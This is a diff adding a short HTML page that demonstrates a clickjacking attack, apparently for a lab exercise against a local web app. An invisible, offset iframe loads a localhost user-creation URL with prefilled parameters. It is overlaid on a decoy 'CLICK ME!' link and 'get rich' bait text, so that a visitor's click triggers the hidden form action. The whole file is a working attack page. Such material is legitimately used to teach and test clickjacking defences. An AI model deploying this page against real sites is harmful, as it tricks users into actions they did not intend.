@@ -1,0 +1,40 @@
+﻿<!DOCTYPE html>
+<html>
+<head>
+  <title></title>
+  <meta charset="utf-8" />
+</head>
+<body>
+  <style>
+    #mydiv {
+      margin: 30px;
+      position: relative;
+      overflow: hidden;
+      height: 35px;
+      width: 100px;
+    }
+
+    #myframe {
+      position: absolute;
+      top: -340px;
+      left: -30px;
+      opacity: 0;
+    }
+  </style>
+
+  <h1>Click on the link to get rich now:</h1>
+
+  <div id="mydiv">
+    <iframe id="myframe"
+            height="1000px"
+            scrolling="no"
+            src="http://localhost:50297/Users/Create?name=Creazy&login=Dave&email=test@test.com"
+            width="1000px"></iframe>
+  </div>
+
+  <a href="http://www.google.com" target="_blank" style="position: relative; top: -60px;left: 30px; z-index: -1">CLICK ME!</a>
+  
+  <h1>You'll be rich for the whole life!</h1>
+
+</body>
+</html>
